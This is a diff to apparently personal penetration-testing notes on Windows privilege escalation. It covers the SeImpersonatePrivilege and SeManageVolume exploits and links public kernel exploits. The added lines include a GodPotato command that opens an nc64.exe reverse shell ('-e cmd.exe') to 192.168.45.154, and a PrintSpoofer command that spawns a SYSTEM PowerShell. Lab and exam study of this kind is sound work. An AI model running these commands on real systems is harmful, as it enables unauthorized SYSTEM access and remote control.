@@ -173,11 +173,20 @@
 ## public exploit
 -  kernel exploit (easy crash)
 - https://github.com/SecWiki/windows-kernel-exploits
-### printspoofer
--  If ```whoami /priv``` shows ``` SeImpersonatePrivlege``` enabled = can use 
+
+## whoami /priv
+### SeImpersonatePrivlege 
 1. From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.:   ``` .\PrintSpoofer64.exe -i -c powershell.exe ```
-2. From Local user: https://github.com/BeichenDream/GodPotato (Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11)
--  ``` SeManageVolume``` : https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
+2. From Local user & .NET version: https://github.com/BeichenDream/GodPotato (Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11)
+   ``` 
+   
+   reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP" 
+   
+   .\GodPotato-NET4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc64.exe 192.168.45.154 139 -e cmd.exe" 
+
+   ```
+### SeManageVolume 
+- https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 
 # Struggling point
 - may need one user jump to another and then jump to another and still not priviledged
